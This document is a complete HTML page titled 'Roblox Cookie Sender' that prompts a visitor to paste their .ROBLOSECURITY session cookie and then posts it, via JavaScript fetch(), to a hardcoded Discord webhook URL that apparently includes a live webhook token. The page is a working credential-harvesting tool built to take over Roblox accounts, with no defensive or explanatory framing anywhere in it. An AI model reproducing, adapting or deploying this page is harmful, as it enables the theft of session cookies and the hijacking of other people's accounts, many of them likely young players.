<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie Sender</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 500px; margin: 0 auto; padding: 20px; }
        textarea { 
            width: 100%; 
            height: 150px; 
            padding: 10px; 
            margin-bottom: 10px; 
            border: 1px solid #ccc; 
            border-radius: 4px; 
            resize: vertical; 
        }
        button { 
            padding: 10px 20px; 
            background-color: #4CAF50; 
            color: white; 
            border: none; 
            border-radius: 4px; 
            cursor: pointer; 
            font-size: 16px; 
        }
        button:hover { background-color: #45a049; }
        #status { 
            margin-top: 10px; 
            padding: 10px; 
            border-radius: 4px; 
            display: none; 
        }
        .success { 
            background-color: #dff0d8; 
            color: #3c763d; 
        }
        .error { 
            background-color: #f2dede; 
            color: #a94442; 
        }
    </style>
</head>
<body>
    <h1>Roblox Cookie Sender</h1>
    <textarea id="cookieInput" placeholder="Paste your .ROBLOSECURITY cookie here..."></textarea>
    <button onclick="sendToWebhook()">Send to Webhook</button>
    <div id="status"></div>

    <script>
        // Replace this with your actual webhook URL
        const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1394819865360990388/6m4yTDRWX74rS94nZTr-HBfbiTapkR16n0GQJbNbraho6rkE8GzBFapZTcfvKubL4nSb";

        function sendToWebhook() {
            const cookie = document.getElementById('cookieInput').value.trim();
            const statusElement = document.getElementById('status');

            if (!cookie) {
                statusElement.textContent = "Please enter a cookie!";
                statusElement.className = "error";
                statusElement.style.display = "block";
                return;
            }

            const data = {
                content: "⚠️ New Roblox Cookie Submitted ⚠️",
                embeds: [{
                    description: "```" + cookie + "```",
                    color: 0xff0000,
                    timestamp: new Date().toISOString()
                }]
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            })
            .then(response => {
                if (response.ok) {
                    statusElement.textContent = "Cookie sent successfully!";
                    statusElement.className = "success";
                    statusElement.style.display = "block";
                    document.getElementById('cookieInput').value = "";
                } else {
                    throw new Error('Failed to send cookie (Status: ' + response.status + ')');
                }
            })
            .catch(error => {
                statusElement.textContent = "Error: " + error.message;
                statusElement.className = "error";
                statusElement.style.display = "block";
            });
        }
    </script>
</body>
</html>
